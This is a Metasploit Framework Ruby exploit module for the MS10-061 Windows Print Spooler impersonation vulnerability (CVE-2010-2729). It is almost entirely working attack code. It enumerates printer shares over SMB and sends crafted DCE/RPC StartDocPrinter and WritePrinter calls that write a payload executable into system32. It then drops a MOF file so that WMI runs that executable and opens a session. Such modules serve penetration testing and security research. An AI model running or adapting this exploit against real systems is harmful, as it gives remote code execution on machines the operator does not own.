##
# $Id: ms10_061_spoolss.rb 11766 2011-02-17 19:22:11Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/windows_error'
require 'msf/core/exploit/wbemexec'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Print Spooler Service Impersonation Vulnerability',
			'Description'    => %q{
					This module exploits the RPC service impersonation vulnerability detailed in
				Microsoft Bulletin MS10-061. By making a specific DCE RPC request to the
				StartDocPrinter procedure, an attacker can impersonate the Printer Spooler service
				to create a file. The working directory at the time is %SystemRoot%\\system32.
				An attacker can specify any file name, including directory traversal or full paths.
				By sending WritePrinter requests, an attacker can fully control the content of
				the created file.

				In order to gain code execution, this module writes an EXE and then (ab)uses the
				impersonation vulnerability a second time to create a secondary RPC connection
				to the \\PIPE\\ATSVC named pipe. We then proceed to create a remote AT job using
				a blind NetrJobAdd RPC call.
			},
			'Author'         =>
				[
					'jduck',  # re-discovery, printer RPC stubs, module
					'hdm'     # ATSVC RPC proxy method, etc ;)
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11766 $',
			'Platform'       => 'win',
			'References'     =>
				[
					[ 'OSVDB', '67988' ],
					[ 'CVE', '2010-2729' ],
					[ 'MSB', 'MS10-061' ]
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "",
					'DisableNops' => true,
				},
			'Targets'        =>
				[
					[ 'Windows Universal', { } ]
				],
			'DisclosureDate' => 'Sep 14 2010',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('SMBPIPE', [ false,  "The named pipe for the spooler service", "spoolss"]),
				OptString.new('PNAME',   [ false,  "The printer share name to use on the target" ]),
			], self.class)
	end


	def exploit

		connect()
		login_time = Time.now
		smb_login()

		print_status("Trying target #{target.name}...")

		handle = dcerpc_handle('12345678-1234-abcd-EF00-0123456789ab', '1.0', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])

		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)

		print_status("Bound to #{handle} ...")

		# Try all of the printers :)
		printers = []
		if (pname = datastore['PNAME'])
			printers << pname
		else
			res = self.simple.client.trans(
				"\\PIPE\\LANMAN",
				(
					[0x00].pack('v') +
					"WrLeh\x00"   +
					"B13BWz\x00"  +
					[0x01, 65406].pack("vv")
				)
			)

			printers = []

			lerror, lconv, lentries, lcount = res['Payload'].to_s[
				res['Payload'].v['ParamOffset'],
				res['Payload'].v['ParamCount']
			].unpack("v4")

			data = res['Payload'].to_s[
				res['Payload'].v['DataOffset'],
				res['Payload'].v['DataCount']
			]

			0.upto(lentries - 1) do |i|
				sname,tmp = data[(i * 20) +  0, 14].split("\x00")
				stype     = data[(i * 20) + 14, 2].unpack('v')[0]
				scoff     = data[(i * 20) + 16, 2].unpack('v')[0]
				if ( lconv != 0)
					scoff -= lconv
				end
				scomm,tmp = data[scoff, data.length - scoff].split("\x00")

				# we only want printers
				next if stype != 1

				printers << sname
			end
		end

		# Generate a payload EXE to execute
		exe = generate_payload_exe

		printers.each { |pr|

			pname = "\\\\#{rhost}\\#{pr}"

			print_status("Attempting to exploit MS10-061 via #{pname} ...")

			# Open the printer
			status,ph = open_printer_ex(pname)
			if status != 0
				raise RuntimeError, "Unable to open printer: #{Msf::WindowsError.description(status)}"
			end
			print_status("Printer handle: %s" % ph.unpack('H*'))


			# NOTE: fname can be anything nice to write to (cwd is system32), even
			# directory traversal and full paths are OK.
			fname = rand_text_alphanumeric(14) + ".exe"
			write_file_contents(ph, fname, exe)

			# Generate a MOF file and write it so that the Windows Management Service will
			# execute our binary ;)
			mofname = rand_text_alphanumeric(14) + ".mof"
			mof = generate_mof(mofname, fname)
			write_file_contents(ph, "wbem\\mof\\#{mofname}", mof)

			# ClosePrinter
			status,ph = close_printer(ph)
			if status != 0
				raise RuntimeError, "Failed to close printer: #{Msf::WindowsError.description(status)}"
			end

			break if session_created?
		}

		#print_status("Everything should be set, waiting up to two minutes for a session...")
		print_status("Everything should be set, waiting for a session...")
		handler
		disconnect

	rescue ::Rex::Proto::SMB::Exceptions::ErrorCode, Rex::ConnectionError
		raise RuntimeError, $!.message
	end


	#
	# Use the vuln to write a file :)
	#
	def write_file_contents(ph, fname, data)

		doc = rand_text_alphanumeric(16+rand(16))

		# StartDocPrinter
		status,jobid = start_doc_printer(ph, doc, fname)
		if status != 0 or jobid < 0
			raise RuntimeError, "Unable to start print job: #{Msf::WindowsError.description(status)}"
		end
		print_status("Job started: 0x%x" % jobid)

		# WritePrinter
		status,wrote = write_printer(ph, data)
		if status != 0 or wrote != data.length
			raise RuntimeError, ('Failed to write %d bytes!' % data.length)
		end
		print_status("Wrote %d bytes to %%SystemRoot%%\\system32\\%s" % [data.length, fname])

		# EndDocPrinter
		status = end_doc_printer(ph)
		if status != 0
			raise RuntimeError, "Failed to end print job: #{Msf::WindowsError.description(status)}"
		end
	end


	#
	# Call RpcOpenPrinterEx
	#
	def open_printer_ex(pname, machine = nil, user = nil)
=begin
		DWORD RpcOpenPrinterEx(
			[in, string, unique] STRING_HANDLE pPrinterName,
			[out] PRINTER_HANDLE* pHandle,
			[in, string, unique] wchar_t* pDatatype,
			[in] DEVMODE_CONTAINER* pDevModeContainer,
			[in] DWORD AccessRequired,
			[in] SPLCLIENT_CONTAINER* pClientInfo
		);
=end

		# NOTE: For more information about this encoding, see the following
		# sections of the Open Group's C706 DCE 1.1: RPC
		#
		# 14.3.8 Unions
		# 14.3.10 Pointers
		# 14.3.12.3 Algorithm for Deferral of Referents
		#
		machine ||= ''
		machine = NDR.uwstring(machine)
		user ||= ''
		user = NDR.uwstring(user)

		splclient_info =
			NDR.long(0) +          # DWORD dwSize;
			machine[0,4] +         # [string] wchar_t* pMachineName;
			user[0,4] +            # [string] wchar_t* pUserName;
			NDR.long(7600) +       # DWORD dwBuildNum
			NDR.long(3) +          # DWORD dwMajorVersion;
			NDR.long(0) +          # DWORD dwMinorVersion;
			NDR.long(9)            # unsigned short wProcessorArchitecture;

		# Add the deferred members
		splclient_info << machine[4, machine.length]
		splclient_info << user[4, user.length]

		splclient_info[0,4] = NDR.long(splclient_info.length)

		splclient_info =
			# union!
			NDR.long(1) +        # discriminant (inside copy)
			NDR.long(rand(0xffffffff)) +
			splclient_info

		stubdata =
			NDR.uwstring(pname) +  # pPrinterName
			NDR.long(0) +
			# DEVMODE_CONTAINER (null)
			NDR.long(0) +
			NDR.long(0) +
			# AccessRequired
			NDR.long(0x02020000) +
			# SPLCLIENT_CONTAINER
			NDR.long(1) + # Level (must be 1)
			# SPLCLIENT_INFO_1
			splclient_info

		#print_status('Sending OpenPrinterEx request...')
		response = dcerpc.call(69, stubdata)
		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			#print_status("\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))

			handle = dcerpc.last_response.stub_data[0,20]
			status = dcerpc.last_response.stub_data[20,4].unpack('V').first

			return [status, handle]
		end

		nil
	end


	#
	# Call RpcStartDocPrinter
	#
	def start_doc_printer(handle, dname, fname, dtype = nil)
=begin
		typedef struct _DOC_INFO_CONTAINER {
			DWORD Level;
			[switch_is(Level)] union {
				[case(1)]
				DOC_INFO_1* pDocInfo1;
			} DocInfo;
		} DOC_INFO_CONTAINER;
		DWORD RpcStartDocPrinter(
			[in] PRINTER_HANDLE hPrinter,
			[in] DOC_INFO_CONTAINER* pDocInfoContainer,
			[out] DWORD* pJobId
		);
=end
		dname = NDR.uwstring(dname)
		if fname
			fname = NDR.uwstring(fname)
		else
			fname = NDR.long(0)
		end
		if dtype
			dtype = NDR.uwstring(dtype)
		else
			dtype = NDR.long(0)
		end

		doc_info =
			dname[0, 4] +
			fname[0, 4] +
			dtype[0, 4]

		# Add the deferred members
		doc_info << dname[4, dname.length]
		doc_info << fname[4, fname.length]
		doc_info << dtype[4, dtype.length]

		doc_info =
			# Union!
			NDR.long(1) +
			NDR.long(rand(0xffffffff)) +
			doc_info

		stubdata =
			handle +
			NDR.long(1) +
			doc_info

		#print_status('Sending StartDocPrinter request...')
		response = dcerpc.call(17, stubdata)
		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			#print_status("\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))
			jobid, status = dcerpc.last_response.stub_data.unpack('VV')
			return [status, jobid]
		end

		nil
	end


	#
	# Call RpcWritePrinter
	#
	def write_printer(handle, data)
=begin
		DWORD RpcWritePrinter(
			[in] PRINTER_HANDLE hPrinter,
			[in, size_is(cbBuf)] BYTE* pBuf,
			[in] DWORD cbBuf,
			[out] DWORD* pcWritten
		);
=end
		stubdata =
			handle +
			NDR.long(data.length) +
			# Perhaps we need a better data type for BYTE* :)
			data +
			NDR.align(data) +
			NDR.long(data.length)

		#print_status('Sending WritePrinter request...')
		response = dcerpc.call(19, stubdata)
		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			#print_status("\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))
			wrote,status = dcerpc.last_response.stub_data.unpack('VV')
			return [status, wrote]
		end

		nil
	end


	#
	# Call RpcEndDocPrinter
	#
	def end_doc_printer(handle)
=begin
		DWORD RpcEndDocPrinter(
			[in] PRINTER_HANDLE* phPrinter
		);
=end

		#print_status('Sending EndDocPrinter request...')
		response = dcerpc.call(23, handle)
		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			#print_status("\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))
			status = dcerpc.last_response.stub_data[0,4].unpack('V').first
			return status
		end

		nil
	end


	#
	# Call RpcClosePrinter
	#
	def close_printer(handle)
=begin
		DWORD RpcClosePrinter(
			[in, out] PRINTER_HANDLE* phPrinter
		);
=end

		#print_status('Sending ClosePrinter request...')
		response = dcerpc.call(29, handle)
		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			#print_status("\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))
			handle = dcerpc.last_response.stub_data[0,20]
			status = dcerpc.last_response.stub_data[20,4].unpack('V').first
			return [status,handle]
		end

		nil
	end


	def seconds_since_midnight(time)
		# .tv_sec always uses .utc
		(time.tv_sec % 86400)

		# This method uses the localtime
		#(time.hour * 3600) + (time.min * 60) + (time.sec)
	end

	# We have to wait a bit longer since the WMI service is a bit slow..
	def wfs_delay
		10
	end

end